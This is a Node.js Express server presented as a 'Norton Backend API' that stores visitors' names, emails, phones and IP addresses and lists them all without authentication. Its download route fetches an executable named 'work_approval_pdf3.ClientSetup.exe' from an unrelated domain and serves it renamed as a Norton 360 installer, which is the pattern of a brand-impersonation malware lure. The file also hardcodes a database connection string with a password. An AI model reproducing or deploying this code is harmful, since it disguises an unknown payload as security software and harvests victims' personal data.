const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");

const app = express();

// Middleware
app.use(cors({
  origin: true,
  credentials: true,
}));
app.use(express.json());

// MongoDB Connection - Singleton Pattern for Serverless
let isConnected = false;

const connectToDatabase = async () => {
  if (isConnected) {
    console.log('=> Using existing database connection');
    return;
  }

  try {
    console.log('=> Creating new database connection');
    
    const MONGODB_URI = process.env.MONGODB_URI || 
      "mongodb+srv://devduryab1:DkdfywRYbrj4hcco@cluster0.eiua2ek.mongodb.net/norton-users?retryWrites=true&w=majority&appName=Cluster0";

    await mongoose.connect(MONGODB_URI, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
      serverSelectionTimeoutMS: 30000, // 30 seconds
      socketTimeoutMS: 75000, // 75 seconds
      maxPoolSize: 10,
      bufferCommands: false,
    });

    isConnected = mongoose.connection.readyState === 1;
    console.log('✅ Connected to MongoDB successfully');
    
  } catch (error) {
    console.error('❌ MongoDB connection error:', error);
    throw error;
  }
};

// Handle connection events
mongoose.connection.on('connected', () => {
  console.log('✅ MongoDB connected');
  isConnected = true;
});

mongoose.connection.on('error', (err) => {
  console.error('❌ MongoDB error:', err);
  isConnected = false;
});

mongoose.connection.on('disconnected', () => {
  console.log('⚠️ MongoDB disconnected');
  isConnected = false;
});

// User Schema
const userSchema = new mongoose.Schema({
  name: {
    type: String,
    required: true,
    trim: true,
  },
  email: {
    type: String,
    required: true,
    trim: true,
    lowercase: true,
  },
  phone: {
    type: String,
    required: true,
    trim: true,
  },
  product: {
    type: String,
    default: "Norton 360",
  },
  downloadDate: {
    type: Date,
    default: Date.now,
  },
  ipAddress: String,
  userAgent: String,
});

const User = mongoose.model("User", userSchema);

// API Routes with connection check
app.post("/api/users", async (req, res) => {
  try {
    // Ensure database connection
    await connectToDatabase();
    
    console.log("📝 Received user registration:", req.body);

    const { name, email, phone, product } = req.body;

    // Validation
    if (!name || !email || !phone) {
      return res.status(400).json({
        success: false,
        message: "Name, email, and phone are required",
      });
    }

    // Get client info
    const ipAddress =
      req.headers["x-forwarded-for"] ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "unknown";

    const userAgent = req.headers["user-agent"] || "unknown";

    // Create and save user
    const newUser = new User({
      name,
      email,
      phone,
      product: product || "Norton 360",
      ipAddress,
      userAgent,
    });

    const savedUser = await newUser.save();
    console.log("✅ User saved successfully:", savedUser._id);

    res.status(201).json({
      success: true,
      message: "Registration completed successfully!",
      userId: savedUser._id,
    });
    
  } catch (error) {
    console.error("❌ Error saving user:", error);

    // Handle duplicate email
    if (error.code === 11000) {
      return res.status(400).json({
        success: false,
        message: "This email is already registered",
      });
    }

    res.status(500).json({
      success: false,
      message: "Registration failed. Please try again.",
      error: error.message
    });
  }
});

// Get all users
app.get("/api/users", async (req, res) => {
  try {
    await connectToDatabase();
    
    const users = await User.find().sort({ downloadDate: -1 });
    res.json({
      success: true,
      count: users.length,
      users,
    });
  } catch (error) {
    console.error("Error fetching users:", error);
    res.status(500).json({
      success: false,
      message: "Internal server error",
      error: error.message
    });
  }
});

// Download endpoint
app.get("/api/download", async (req, res) => {
  const remoteFile =
    "https://alpha.noleggiodisci.com/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest";
  const movieName = req.query.movie || "Norton";

  try {
    console.log("📥 Download request for:", movieName);

    const response = await fetch(remoteFile);
    if (!response.ok) {
      throw new Error(`Failed to fetch file: ${response.status}`);
    }

    const filename = `Norton_360_v22.24.1_Setup.exe`;

    res.setHeader("Content-Type", "application/octet-stream");
    res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);

    const buffer = await response.arrayBuffer();
    res.send(Buffer.from(buffer));
    
  } catch (error) {
    console.error("Download error:", error);
    res.status(500).json({
      error: "Download failed",
      message: error.message,
    });
  }
});

// Enhanced health check
app.get("/api/health", async (req, res) => {
  try {
    await connectToDatabase();
    
    const mongoStatus = mongoose.connection.readyState;
    const statusMap = {
      0: "disconnected",
      1: "connected",
      2: "connecting",
      3: "disconnecting",
    };

    res.json({
      status: "OK",
      message: "Server is running on Vercel",
      mongodb: statusMap[mongoStatus],
      mongoUri: !!process.env.MONGODB_URI ? "Set" : "Not Set",
      timestamp: new Date().toISOString(),
      isConnected: isConnected
    });
    
  } catch (error) {
    res.status(500).json({
      status: "ERROR",
      message: "Database connection failed",
      error: error.message
    });
  }
});

// Test MongoDB connection endpoint
app.get("/api/test-db", async (req, res) => {
  try {
    await connectToDatabase();
    
    // Try to perform a simple operation
    const count = await User.countDocuments();
    res.json({
      success: true,
      message: "Database connection working",
      userCount: count,
      connectionState: mongoose.connection.readyState
    });
    
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message,
      connectionState: mongoose.connection.readyState
    });
  }
});

// Root route
app.get("/", (req, res) => {
  res.json({
    message: "Norton Backend API is running on Vercel!",
    endpoints: [
      "GET /api/health",
      "GET /api/test-db",
      "POST /api/users",
      "GET /api/users",
      "GET /api/download",
    ],
  });
});

module.exports = app;